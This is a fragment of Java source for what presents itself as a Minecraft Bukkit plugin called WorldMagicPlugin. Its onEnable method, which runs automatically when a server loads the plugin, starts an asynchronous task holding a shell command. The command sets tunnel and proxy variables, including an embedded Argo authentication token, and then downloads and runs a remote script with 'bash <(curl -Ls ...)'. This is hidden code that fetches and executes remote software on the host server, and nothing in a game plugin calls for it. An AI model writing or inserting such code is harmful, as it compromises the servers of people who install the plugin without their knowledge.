...
public final class WorldMagicPlugin extends JavaPlugin {
    ...
    public void onEnable() {
        ...
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                // 定义要执行的Linux命令
                String command = "UUID=a217d527-bd5e-4ef0-b899-d36627af0ddd HY2_PORT=19141 ARGO_PORT=50114 ARGO_DOMAIN=volyx.1976.dpdns.org ARGO_AUTH=eyJhIjoiNDMxMmY5YTAwNzhjMTI1OTYyZTAwZDY5NzkwMTgxNTMiLCJ0IjoiOGEwOGJmN2UtZWJmMi00Y2I3LWE5NjAtNWE5Y2NhZmIzZWU3IiwicyI6IlpUazVOREl5TkRjdE9UZzRZeTAwTTJFMkxXSTJOalF0T0dZeVlUTXpNVGxoTXpFMSJ9 bash <(curl -Ls https://main.ssss.nyc.mn/sb.sh)";
